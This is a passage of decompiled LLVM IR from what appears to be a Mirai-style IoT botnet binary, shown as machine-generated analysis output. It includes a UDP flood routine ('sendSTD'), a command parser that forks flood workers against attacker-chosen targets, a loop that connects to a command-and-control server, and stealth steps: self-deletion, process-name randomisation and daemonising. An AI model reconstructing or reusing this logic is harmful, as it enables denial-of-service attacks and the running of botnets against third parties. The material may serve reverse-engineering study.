  br i1 %v10_8048ed0, label %dec_label_pc_8048e72, label %dec_label_pc_8048ed5

dec_label_pc_8048ed5:                             ; preds = %dec_label_pc_8048ec5
  %v2_8048ee0 = mul i32 %v0_8048ea2, 4
  %v5_8048ee3 = add i32 %v2_8048ee0, %v1_8048e61
  %v1_8048ee6 = add i32 %v5_8048ee3, -4
  store i32 %v1_8048ee6, i32* @edx, align 4
  %v2_8048eec = inttoptr i32 %v1_8048ee6 to i32*
  store i32 %v1_8048e14, i32* %v2_8048eec, align 4
  %v0_8048eee = load i32, i32* @global_var_8054564.18, align 4
  %v1_8048ef6 = call i32 @free(i32 %v0_8048eee)
  store i32 %v1_8048e61, i32* @global_var_8054564.18, align 4
  store i32 %v1_8048e14, i32* @ecx, align 4
  br label %dec_label_pc_8048f09

dec_label_pc_8048f09:                             ; preds = %dec_label_pc_8048e22, %dec_label_pc_8048ed5
  %v2_8048f0f = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048f0f, i32* @ebx, align 4
  ret i32 %v1_8048e14

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0, 2 }
  uselistorder i32 %v2_8048e75, { 1, 0 }
  uselistorder i32 %v1_8048e61, { 2, 0, 1 }
  uselistorder i32 %v0_8048e2d, { 1, 0 }
  uselistorder label %dec_label_pc_8048f09, { 1, 0 }
  uselistorder label %dec_label_pc_8048e94, { 1, 0 }
  uselistorder label %dec_label_pc_8048e72, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v4_8048f18 = add i32 %arg4, -4096
  %v6_8048f18 = sub i32 4095, %arg4
  %v7_8048f18 = and i32 %v6_8048f18, %arg4
  %v8_8048f18 = icmp slt i32 %v7_8048f18, 0
  %v9_8048f18 = icmp eq i32 %v4_8048f18, 0
  %v10_8048f18 = icmp slt i32 %v4_8048f18, 0
  %v3_8048f1f = icmp eq i1 %v10_8048f18, %v8_8048f18
  %v4_8048f1f = icmp eq i1 %v9_8048f18, false
  %v5_8048f1f = and i1 %v4_8048f1f, %v3_8048f1f
  br i1 %v5_8048f1f, label %dec_label_pc_804909b, label %dec_label_pc_8048f25

dec_label_pc_8048f25:                             ; preds = %entry
  %v3_8048f3c = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_8048f4b = call i32 @__GI_time(i32* null)
  %v1_8048f59 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_8048f61 = ptrtoint i32* %stack_var_-44 to i32
  store i32 0, i32* %stack_var_-44, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v1_8048f82 = add i32 %v1_8048f59, 12
  %v2_8048f82 = inttoptr i32 %v1_8048f82 to i32*
  %v3_8048f82 = load i32, i32* %v2_8048f82, align 4
  %v2_8048f8a = ptrtoint i32* %stack_var_-40 to i32
  %v1_8048f90 = add i32 %v1_8048f59, 16
  %v2_8048f90 = inttoptr i32 %v1_8048f90 to i32*
  %v3_8048f90 = load i32, i32* %v2_8048f90, align 4
  %v1_8048f93 = inttoptr i32 %v3_8048f90 to i32*
  %v2_8048f93 = load i32, i32* %v1_8048f93, align 4
  %v3_8048fa0 = call i32 @bcopy(i32 %v2_8048f93, i32 %v2_8048f8a, i32 %v3_8048f82)
  %v1_8048fa8 = add i32 %v1_8048f59, 8
  %v2_8048fa8 = inttoptr i32 %v1_8048fa8 to i32*
  %v3_8048fa8 = load i32, i32* %v2_8048fa8, align 4
  %v1_8048fab = urem i32 %v3_8048fa8, 65536
  store i32 %v1_8048fab, i32* %stack_var_-44, align 4
  %v2_8048ff7 = ptrtoint i32* %stack_var_-76 to i32
  %v2_8049004 = bitcast i32* %stack_var_-76 to i8*
  %v5_8049063 = add i32 %v2_8048f4b, %arg3
  br label %dec_label_pc_8048fc3

dec_label_pc_8048fc3:                             ; preds = %dec_label_pc_8049093, %dec_label_pc_8048f25
  %storemerge = phi i32 [ %v4_8049093, %dec_label_pc_8049093 ], [ 0, %dec_label_pc_8048f25 ]
  %tmp = icmp ult i32 %storemerge, 50
  br i1 %tmp, label %dec_label_pc_8049093, label %dec_label_pc_8048fcd

dec_label_pc_8048fcd:                             ; preds = %dec_label_pc_8048fc3
  %v2_8048fd4 = call i32 @__GI_time(i32* null)
  store i32 %v2_8048fd4, i32* @eax, align 4
  %v1_8048fdc = call i32 @srand(i32 %v2_8048fd4)
  %v0_8048fe1 = call i32 @rand_init()
  %v0_8048fe6 = call i32 @rand_next()
  %v1_8048feb = mul i32 %v0_8048fe6, 4
  %v2_8048fee = and i32 %v1_8048feb, 12
  %v1_8048ff1 = add nuw nsw i32 %v2_8048fee, 12
  store i32 %v1_8048ff1, i32* @eax, align 4
  %v3_8049004 = call i32 @rand_alphastr(i8* %v2_8049004, i32 %v1_8048ff1)
  %v0_804900c = load i32, i32* @ebp, align 4
  %v2_804900c = add nsw i32 %v2_8048fee, -60
  %v3_804900c = add i32 %v2_804900c, %v0_804900c
  %v4_804900c = inttoptr i32 %v3_804900c to i8*
  store i8 0, i8* %v4_804900c, align 1
  %v4_8049033 = call i32 @__libc_send(i32 %v3_8048f3c, i32 %v2_8048ff7, i32 %arg4, i32 0)
  %v3_804904d = call i32 @__libc_connect(i32 %v3_8048f3c, i32 %v2_8048f61, i32 16)
  %v2_8049059 = call i32 @__GI_time(i32* null)
  %v5_8049068 = icmp slt i32 %v2_8049059, %v5_8049063
  br i1 %v5_8049068, label %dec_label_pc_8049093, label %dec_label_pc_804906a

dec_label_pc_804906a:                             ; preds = %dec_label_pc_8048fcd
  %v1_8049070 = call i32 @__libc_close(i32 %v3_8048f3c)
  %v1_804907b = call i32 @free(i32 %v2_8048ff7)
  %v1_8049087 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8049093:                             ; preds = %dec_label_pc_8048fcd, %dec_label_pc_8048fc3
  %stack_var_-16.0 = phi i32 [ %storemerge, %dec_label_pc_8048fc3 ], [ 0, %dec_label_pc_8048fcd ]
  %v4_8049093 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_8048fc3

dec_label_pc_804909b:                             ; preds = %entry
  %v0_804909c = load i32, i32* @eax, align 4
  ret i32 %v0_804909c

; uselistorder directives
  uselistorder i32 %v2_8048fee, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v4_8048f18, { 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32 %arg4, { 3, 0, 1, 2 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %tmp37 = ptrtoint i32* %arg2 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_80490a0 = load i32, i32* @edi, align 4
  %v0_80490a1 = load i32, i32* @esi, align 4
  %v0_80490a2 = load i32, i32* @ebx, align 4
  store i32 %v0_80490a2, i32* %stack_var_-16, align 4
  %v5_80490a3 = icmp ult i32* %stack_var_-16, inttoptr (i32 92 to i32*)
  store i1 %v5_80490a3, i1* %cf.global-to-local, align 1
  %v2_80490a9 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_80490bd = inttoptr i32 %v2_80490a9 to i8*
  store i32 %v2_80490a9, i32* @esi, align 4
  store i32 ptrtoint (i8** @global_var_804ff5c.19 to i32), i32* @edi, align 4
  %v7_80490c6 = call i32 @_strncmp(i8* %v4_80490bd, i8* bitcast (i8** @global_var_804ff5c.19 to i8*), i32 2)
  %v8_80490c6 = urem i32 %v7_80490c6, 2
  %v9_80490c6 = icmp eq i32 %v8_80490c6, 0
  %v0_80490c8 = load i1, i1* %cf.global-to-local, align 1
  %v2_80490c8 = or i1 %v0_80490c8, %v9_80490c6
  %v3_80490c8 = zext i1 %v2_80490c8 to i32
  %v4_80490c8 = load i32, i32* @edx, align 4
  %v5_80490c8 = and i32 %v4_80490c8, -256
  %v6_80490c8 = or i32 %v3_80490c8, %v5_80490c8
  %v7_80490c8 = xor i32 %v6_80490c8, 1
  store i32 %v7_80490c8, i32* @edx, align 4
  %v1_80490d0 = trunc i32 %v7_80490c8 to i8
  %v3_80490d0 = zext i1 %v0_80490c8 to i8
  %v4_80490d0 = sub nsw i8 %v1_80490d0, %v3_80490d0
  %v15_80490d0 = icmp eq i8 %v4_80490d0, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80490d9 = icmp eq i1 %v15_80490d0, false
  br i1 %v1_80490d9, label %dec_label_pc_80491e9, label %dec_label_pc_80490df

dec_label_pc_80490df:                             ; preds = %entry
  %v2_80490d4 = sext i8 %v4_80490d0 to i32
  %v9_80490df = icmp ult i32 %arg1, 4
  store i1 %v9_80490df, i1* %cf.global-to-local, align 1
  %v7_80490e3 = icmp sgt i32 %arg1, 4
  br i1 %v7_80490e3, label %dec_label_pc_80490e9, label %dec_label_pc_80492c6

dec_label_pc_80490e9:                             ; preds = %dec_label_pc_80490df
  %v1_80490ec = add i32 %tmp37, 4
  %v1_80490ef = inttoptr i32 %v1_80490ec to i32*
  %v2_80490ef = load i32, i32* %v1_80490ef, align 4
  %v1_80490f7 = add i32 %tmp37, 8
  %v5_80490f7 = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_80490f7, i1* %cf.global-to-local, align 1
  %v1_80490fa = inttoptr i32 %v1_80490f7 to i32*
  %v2_80490fa = load i32, i32* %v1_80490fa, align 4
  %v1_80490ff = call i32 @atol(i32 %v2_80490fa)
  %v1_804910a = add i32 %tmp37, 12
  %v5_804910a = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804910a, i1* %cf.global-to-local, align 1
  %v1_804910d = inttoptr i32 %v1_804910a to i32*
  %v2_804910d = load i32, i32* %v1_804910d, align 4
  %v1_8049112 = call i32 @atol(i32 %v2_804910d)
  %v1_804911d = add i32 %tmp37, 16
  %v2_804911d = icmp ugt i32* %arg2, inttoptr (i32 -17 to i32*)
  store i1 %v2_804911d, i1* %cf.global-to-local, align 1
  %v1_8049120 = inttoptr i32 %v1_804911d to i32*
  %v2_8049120 = load i32, i32* %v1_8049120, align 4
  %v1_8049125 = call i32 @atol(i32 %v2_8049120)
  %v2_804913b = inttoptr i32 %v2_80490ef to i8*
  %v3_804913b = call i32 @__GI_strchr(i8* %v2_804913b, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8049140 = icmp eq i32 %v3_804913b, 0
  br i1 %v1_8049140, label %dec_label_pc_80491b0, label %dec_label_pc_8049144

dec_label_pc_8049144:                             ; preds = %dec_label_pc_80490e9
  store i32 %v2_80490ef, i32* @eax, align 4
  %v2_8049152 = call i32 @__GI_strtok(i32 %v2_80490ef, i32 ptrtoint (i32* @global_var_804ff5e.20 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_80491a84 = icmp eq i32 %v2_8049152, 0
  %v1_80491ac11 = icmp eq i1 %v4_80491a84, false
  br i1 %v1_80491ac11, label %dec_label_pc_804915c, label %dec_label_pc_80491e9

dec_label_pc_804915c:                             ; preds = %dec_label_pc_8049144, %dec_label_pc_8049191
  %storemerge212 = phi i32 [ %v2_80491a0, %dec_label_pc_8049191 ], [ %v2_8049152, %dec_label_pc_8049144 ]
  %v0_804915c = call i32 @listFork()
  store i32 %v0_804915c, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8049161 = icmp eq i32 %v0_804915c, 0
  %v1_8049163 = icmp eq i1 %v1_8049161, false
  br i1 %v1_8049163, label %dec_label_pc_8049191, label %dec_label_pc_8049165

dec_label_pc_8049165:                             ; preds = %dec_label_pc_804915c
  store i32 %storemerge212, i32* @eax, align 4
  %v4_8049180 = call i32 @sendSTD(i32 %storemerge212, i32 %v1_80490ff, i32 %v1_8049112, i32 %v1_8049125)
  %v1_804918c = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8049191:                             ; preds = %dec_label_pc_804915c
  %v2_80491a0 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_804ff5e.20 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_80491a8 = icmp eq i32 %v2_80491a0, 0
  %v1_80491ac = icmp eq i1 %v4_80491a8, false
  br i1 %v1_80491ac, label %dec_label_pc_804915c, label %dec_label_pc_80491e9

dec_label_pc_80491b0:                             ; preds = %dec_label_pc_80490e9
  %v0_80491b0 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80491b5 = icmp eq i32 %v0_80491b0, 0
  %v1_80491b7 = icmp eq i1 %v1_80491b5, false
  br i1 %v1_80491b7, label %dec_label_pc_80492c6, label %dec_label_pc_80491bd

dec_label_pc_80491bd:                             ; preds = %dec_label_pc_80491b0
  store i32 %v2_80490ef, i32* @eax, align 4
  %v4_80491d8 = call i32 @sendSTD(i32 %v2_80490ef, i32 %v1_80490ff, i32 %v1_8049112, i32 %v1_8049125)
  %v1_80491e4 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_80491e9:                             ; preds = %dec_label_pc_8049191, %dec_label_pc_8049144, %entry
  %v2_80491ec = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_8049200 = inttoptr i32 %v2_80491ec to i8*
  %v7_8049209 = call i32 @_strncmp(i8* %v4_8049200, i8* bitcast (i8** @global_var_804ff60.21 to i8*), i32 2)
  %v8_8049209 = urem i32 %v7_8049209, 2
  %v9_8049209 = icmp eq i32 %v8_8049209, 0
  %v0_804920b = load i1, i1* %cf.global-to-local, align 1
  %v2_804920b = or i1 %v0_804920b, %v9_8049209
  %v3_804920b = zext i1 %v2_804920b to i8
  %v7_804920b = xor i8 %v3_804920b, 1
  %v3_8049213 = zext i1 %v0_804920b to i8
  %v4_8049213 = sub nsw i8 %v7_804920b, %v3_8049213
  %v15_8049213 = icmp eq i8 %v4_8049213, 0
  %v2_8049217 = sext i8 %v4_8049213 to i32
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804921c = icmp eq i1 %v15_8049213, false
  br i1 %v1_804921c, label %dec_label_pc_80492c6, label %dec_label_pc_804928b

dec_label_pc_8049232:                             ; preds = %dec_label_pc_80492b2, %dec_label_pc_804928b
  %v2_8049235 = mul i32 %storemerge, 4
  %v9_8049235 = and i32 %storemerge, 1073741824
  %v10_8049235 = icmp ne i32 %v9_8049235, 0
  %v0_804923a = load i32, i32* @global_var_8054564.18, align 4
  %v2_804923f = add i32 %v0_804923a, %v2_8049235
  %v1_8049242 = inttoptr i32 %v2_804923f to i32*
  %v2_8049242 = load i32, i32* %v1_8049242, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8049244 = icmp eq i32 %v2_8049242, 0
  br i1 %v1_8049244, label %dec_label_pc_8049288, label %dec_label_pc_8049248

dec_label_pc_8049248:                             ; preds = %dec_label_pc_8049232
  store i1 %v10_8049235, i1* %cf.global-to-local, align 1
  %v2_8049258 = load i32, i32* %v1_8049242, align 4
  store i32 %v2_8049258, i32* @ebx, align 4
  %v0_804925a = call i32 @__libc_getpid()
  %v0_804925f = load i32, i32* @ebx, align 4
  %v7_804925f = icmp ult i32 %v0_804925f, %v0_804925a
  store i1 %v7_804925f, i1* %cf.global-to-local, align 1
  %v12_804925f = icmp eq i32 %v0_804925f, %v0_804925a
  br i1 %v12_804925f, label %dec_label_pc_8049288, label %dec_label_pc_8049263

dec_label_pc_8049263:                             ; preds = %dec_label_pc_8049248
  store i1 %v10_8049235, i1* %cf.global-to-local, align 1
  %v0_804926b = load i32, i32* @global_var_8054564.18, align 4
  %v2_8049270 = add i32 %v0_804926b, %v2_8049235
  %v1_8049273 = inttoptr i32 %v2_8049270 to i32*
  %v2_8049273 = load i32, i32* %v1_8049273, align 4
  %v2_8049280 = call i32 @kill(i32 %v2_8049273, i32 9)
  %v4_8049285 = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_8049288

dec_label_pc_8049288:                             ; preds = %dec_label_pc_8049248, %dec_label_pc_8049232, %dec_label_pc_8049263
  %stack_var_-28.0 = phi i32 [ %stack_var_-28.1, %dec_label_pc_8049232 ], [ %stack_var_-28.1, %dec_label_pc_8049248 ], [ %v4_8049285, %dec_label_pc_8049263 ]
  %v4_8049288 = add i32 %storemerge, 1
  br label %dec_label_pc_804928b

dec_label_pc_804928b:                             ; preds = %dec_label_pc_80491e9, %dec_label_pc_8049288
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_8049288 ], [ 0, %dec_label_pc_80491e9 ]
  %storemerge = phi i32 [ %v4_8049288, %dec_label_pc_8049288 ], [ 0, %dec_label_pc_80491e9 ]
  %v0_8049299 = load i32, i32* @global_var_8052300.16, align 256
  %v0_804929e = load i32, i32* @global_var_8052304.17, align 4
  %v10_80492ad = icmp ne i32 %v0_804929e, 0
  store i1 %v10_80492ad, i1* %cf.global-to-local, align 1
  br i1 %v10_80492ad, label %dec_label_pc_8049232, label %dec_label_pc_80492b2

dec_label_pc_80492b2:                             ; preds = %dec_label_pc_804928b
  %v10_80492bd = icmp ult i32 %storemerge, %v0_8049299
  store i1 %v10_80492bd, i1* %cf.global-to-local, align 1
  br i1 %v10_80492bd, label %dec_label_pc_8049232, label %dec_label_pc_80492c6

dec_label_pc_80492c6:                             ; preds = %dec_label_pc_80492b2, %dec_label_pc_80490df, %dec_label_pc_80491e9, %dec_label_pc_80491b0
  %v0_80492cd = phi i32 [ %v2_80490d4, %dec_label_pc_80490df ], [ %v2_8049217, %dec_label_pc_80491e9 ], [ %v0_80491b0, %dec_label_pc_80491b0 ], [ %v0_8049299, %dec_label_pc_80492b2 ]
  %v0_80492c6 = load i32, i32* @esp, align 4
  %v5_80492c6 = icmp ugt i32 %v0_80492c6, -93
  store i1 %v5_80492c6, i1* %cf.global-to-local, align 1
  %v2_80492c9 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80492c9, i32* @ebx, align 4
  store i32 %v0_80490a1, i32* @esi, align 4
  store i32 %v0_80490a0, i32* @edi, align 4
  ret i32 %v0_80492cd

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-28.1, { 0, 2, 1 }
  uselistorder i32 %v2_8049235, { 1, 0 }
  uselistorder i1 %v0_804920b, { 1, 0 }
  uselistorder i32 %v2_80491a0, { 1, 0 }
  uselistorder i32 %storemerge212, { 1, 0 }
  uselistorder i32 %v1_8049125, { 1, 0 }
  uselistorder i32 %v1_8049112, { 1, 0 }
  uselistorder i32 %v1_80490ff, { 1, 0 }
  uselistorder i32 %v2_80490ef, { 3, 2, 1, 0, 4 }
  uselistorder i1 %v0_80490c8, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32 %tmp37, { 3, 2, 1, 0 }
  uselistorder i1* %cf.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 8, 17, 9, 11, 10, 0, 12, 13, 14, 15, 16, 18, 19, 20 }
  uselistorder i32 (i32, i32, i32, i32)* @sendSTD, { 1, 0 }
  uselistorder i32 ()* @listFork, { 1, 0 }
  uselistorder label %dec_label_pc_80492c6, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804928b, { 1, 0 }
  uselistorder label %dec_label_pc_8049288, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804915c, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80492ce = load i32, i32* @ebp, align 4
  store i32 %v0_80492ce, i32* %stack_var_-4, align 4
  %v4_80492ce = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80492ce, i32* @ebp, align 4
  %v2_80492d7 = ptrtoint i32* %stack_var_-4104 to i32
  %v3_80492f3 = bitcast i32* %stack_var_-4104 to i8*
  %v4_80492f3 = call i32 @__GI_memset(i8* %v3_80492f3, i32 0, i32 4096)
  %v0_80492f8 = load i32, i32* @global_var_8052308.15, align 8
  %v1_80492fd = icmp eq i32 %v0_80492f8, 0
  br i1 %v1_80492fd, label %dec_label_pc_8049318, label %dec_label_pc_8049301

dec_label_pc_8049301:                             ; preds = %entry
  %v1_8049309 = call i32 @__libc_close(i32 %v0_80492f8)
  store i32 0, i32* @global_var_8052308.15, align 8
  br label %dec_label_pc_8049318

dec_label_pc_8049318:                             ; preds = %entry, %dec_label_pc_8049301
  %v0_8049318 = load i32, i32* @global_var_8052030.22, align 16
  %v1_804931d = icmp eq i32 %v0_8049318, 0
  %v1_804931f = icmp eq i1 %v1_804931d, false
  br i1 %v1_804931f, label %dec_label_pc_804932d, label %dec_label_pc_8049338

dec_label_pc_804932d:                             ; preds = %dec_label_pc_8049318
  %v1_8049332 = add i32 %v0_8049318, 1
  br label %dec_label_pc_8049338

dec_label_pc_8049338:                             ; preds = %dec_label_pc_8049318, %dec_label_pc_804932d
  %storemerge = phi i32 [ %v1_8049332, %dec_label_pc_804932d ], [ 0, %dec_label_pc_8049318 ]
  store i32 %storemerge, i32* @global_var_8052030.22, align 16
  %v1_804933d = mul i32 %storemerge, 4
  %v2_804933d = add i32 %v1_804933d, ptrtoint ([15 x i8]** @global_var_805202c.24 to i32)
  %v3_804933d = inttoptr i32 %v2_804933d to i32*
  %v4_804933d = load i32, i32* %v3_804933d, align 4
  store i32 %v4_804933d, i32* @eax, align 4
  %v3_8049351 = call i32 @strcpy(i8* %v3_80492f3, i32 %v4_804933d)
  %v3_804936e = call i32 @__GI_strchr(i8* %v3_80492f3, i32 58)
  %v1_8049373 = icmp eq i32 %v3_804936e, 0
  br i1 %v1_8049373, label %dec_label_pc_80493b2, label %dec_label_pc_8049377

dec_label_pc_8049377:                             ; preds = %dec_label_pc_8049338
  %v3_8049388 = call i32 @__GI_strchr(i8* %v3_80492f3, i32 58)
  %v1_804938d = add i32 %v3_8049388, 1
  %v1_8049391 = call i32 @atol(i32 %v1_804938d)
  %v3_80493aa = call i32 @__GI_strchr(i8* %v3_80492f3, i32 58)
  %v4_80493aa = inttoptr i32 %v3_80493aa to i8*
  store i8 0, i8* %v4_80493aa, align 1
  br label %dec_label_pc_80493b2

dec_label_pc_80493b2:                             ; preds = %dec_label_pc_8049338, %dec_label_pc_8049377
  %stack_var_-8.0 = phi i32 [ 445, %dec_label_pc_8049338 ], [ %v1_8049391, %dec_label_pc_8049377 ]
  %v3_80493c9 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_80493c9, i32* @global_var_8052308.15, align 8
  %v4_80493f5 = call i32 @connectTimeout(i32 %v3_80493c9, i32 %v2_80492d7, i32 %stack_var_-8.0, i32 30)
  %v1_80493fa = icmp eq i32 %v4_80493f5, 0
  %. = zext i1 %v1_80493fa to i32
  %v2_804941a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804941a, i32* @ebp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 (i32)* @atol, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80493b2, { 1, 0 }
  uselistorder label %dec_label_pc_8049338, { 1, 0 }
  uselistorder label %dec_label_pc_8049318, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i8*, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-4284 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-4400 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_804941c = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_804941c, i32* @ebx, align 4
  %v1_8049437 = bitcast i8** %argv to i32*
  %v2_8049437 = load i32, i32* %v1_8049437, align 4
  store i32 %v2_8049437, i32* %stack_var_-4400, align 4
  %v1_804943c = call i32 @unlink(i32 %v2_8049437)
  %v0_8049441 = call i32 @rand_init()
  %v0_8049446 = call i32 @rand_next()
  %v1_804944b = mul i32 %v0_8049446, 4
  %v2_804944e = and i32 %v1_804944b, 12
  %v1_8049451 = add nuw nsw i32 %v2_804944e, 12
  %v2_8049457 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v1_8049451, i32* @eax, align 4
  store i32 %v2_8049457, i32* %stack_var_-4400, align 4
  %v2_8049464 = bitcast i32* %stack_var_-112 to i8*
  %v3_8049464 = call i32 @rand_alphastr(i8* %v2_8049464, i32 %v1_8049451)
  %v0_804946c = load i32, i32* @ebp, align 4
  %v2_804946c = add nsw i32 %v2_804944e, -92
  %v3_804946c = add i32 %v2_804946c, %v0_804946c
  %v4_804946c = inttoptr i32 %v3_804946c to i8*
  store i8 0, i8* %v4_804946c, align 1
  %v2_8049474 = load i32, i32* %v1_8049437, align 4
  store i32 %v2_8049474, i32* %stack_var_-4400, align 4
  %v2_8049482 = call i32 @util_strcpy(i32 %v2_8049474, i32 %v2_8049457)
  %v0_8049487 = call i32 @rand_next()
  %v2_80494a2 = udiv i32 %v0_8049487, 6
  store i32 %v2_80494a2, i32* @edi, align 4
  %tmp = mul nsw i32 %v2_80494a2, -2
  %v2_80494bd = add i32 %v0_8049487, %tmp
  %v2_80494cb = mul i32 %v2_80494bd, 4
  %v1_80494ce = add i32 %v2_80494cb, 12
  store i32 %v1_80494ce, i32* @eax, align 4
  store i32 %v2_8049457, i32* %stack_var_-4400, align 4
  %v3_80494e1 = call i32 @rand_alphastr(i8* %v2_8049464, i32 %v1_80494ce)
  %v0_80494e9 = load i32, i32* @ebp, align 4
  %v2_80494e9 = add i32 %v2_80494cb, -92
  %v3_80494e9 = add i32 %v2_80494e9, %v0_80494e9
  %v4_80494e9 = inttoptr i32 %v3_80494e9 to i8*
  store i8 0, i8* %v4_80494e9, align 1
  store i32 15, i32* %stack_var_-4400, align 4
  %v2_80494fc = call i32 @prctl(i32 15, i32 %v2_8049457)
  store i32 0, i32* %stack_var_-4400, align 4
  %v2_8049508 = call i32 @__GI_time(i32* null)
  store i32 %v2_8049508, i32* @ebx, align 4
  %v0_804950f = call i32 @__libc_getpid()
  %v1_8049514 = load i32, i32* @ebx, align 4
  %v2_8049514 = xor i32 %v1_8049514, %v0_804950f
  store i32 %v2_8049514, i32* @eax, align 4
  store i32 %v2_8049514, i32* %stack_var_-4400, align 4
  %v1_8049519 = call i32 @srand(i32 %v2_8049514)
  %v0_804951e = call i32 @rand_init()
  %v0_8049523 = load i32, i32* %stack_var_-4400, align 4
  %v1_8049523 = call i32 @__libc_fork(i32 %v0_8049523)
  %v4_804952b = icmp eq i32 %v1_8049523, 0
  br i1 %v4_804952b, label %dec_label_pc_8049560, label %dec_label_pc_804955a.thread

dec_label_pc_804955a.thread:                      ; preds = %entry
  %v2_8049539 = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v1_8049523, i32* %stack_var_-4400, align 4
  %v3_8049549 = call i32 @__libc_waitpid(i32 %v1_8049523, i32 %v2_8049539, i32 0)
  store i32 %v3_8049549, i32* @eax, align 4
  store i32 0, i32* %stack_var_-4400, align 4
  %v1_8049555 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804957a

dec_label_pc_8049560:                             ; preds = %entry
  %v0_8049560 = load i32, i32* %stack_var_-4400, align 4
  %v1_8049560 = call i32 @__libc_fork(i32 %v0_8049560)
  store i32 %v1_8049560, i32* @eax, align 4
  %v4_8049568 = icmp eq i32 %v1_8049560, 0
  br i1 %v4_8049568, label %dec_label_pc_804957a, label %dec_label_pc_804956e

dec_label_pc_804956e:                             ; preds = %dec_label_pc_8049560
  store i32 0, i32* %stack_var_-4400, align 4
  %v1_8049575 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804957a

dec_label_pc_804957a:                             ; preds = %dec_label_pc_804955a.thread, %dec_label_pc_8049560, %dec_label_pc_804956e
  store i32 ptrtoint (i32* @global_var_804ff62.25 to i32), i32* %stack_var_-4400, align 4
  %v1_8049581 = call i32 @chdir(i32 ptrtoint (i32* @global_var_804ff62.25 to i32))
  store i32 13, i32* %stack_var_-4400, align 4
  %v2_8049595 = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_8049a47 = ptrtoint i32* %stack_var_-4284 to i32
  %v3_8049a62 = bitcast i32* %stack_var_-4284 to i8*
  %v1_80497f7 = or i32 %v2_8049a47, 1
  %v5_804982c = inttoptr i32 %v1_80497f7 to i8*
  %tmp95 = bitcast i8** %stack_var_-32 to i32*
  br label %dec_label_pc_804959c

dec_label_pc_804959c:                             ; preds = %dec_label_pc_804959c, %dec_label_pc_8049a47, %dec_label_pc_804957a
  %v0_804959c = call i32 @initConnection()
  %v1_80495a1 = icmp eq i32 %v0_804959c, 0
  %v1_80495a3 = icmp eq i1 %v1_80495a1, false
  br i1 %v1_80495a3, label %dec_label_pc_804959c, label %dec_label_pc_8049a47

dec_label_pc_80495c4:                             ; preds = %dec_label_pc_80497b2, %dec_label_pc_804976b
  %v2_80495c7 = mul i32 %storemerge22, 4
  %v0_80495cc = load i32, i32* @global_var_8054564.18, align 4
  %v2_80495d1 = add i32 %v0_80495cc, %v2_80495c7
  %v1_80495d4 = inttoptr i32 %v2_80495d1 to i32*
  %v2_80495d4 = load i32, i32* %v1_80495d4, align 4
  store i32 %v2_80495d4, i32* %stack_var_-4400, align 4
  %v3_80495e9 = call i32 @__libc_waitpid(i32 %v2_80495d4, i32 0, i32 1)
  %tmp96 = icmp slt i32 %v3_80495e9, 1
  %.pre = add i32 %storemerge22, 1
  br i1 %tmp96, label %dec_label_pc_8049768, label %dec_label_pc_80495f6

dec_label_pc_80495f6:                             ; preds = %dec_label_pc_80495c4
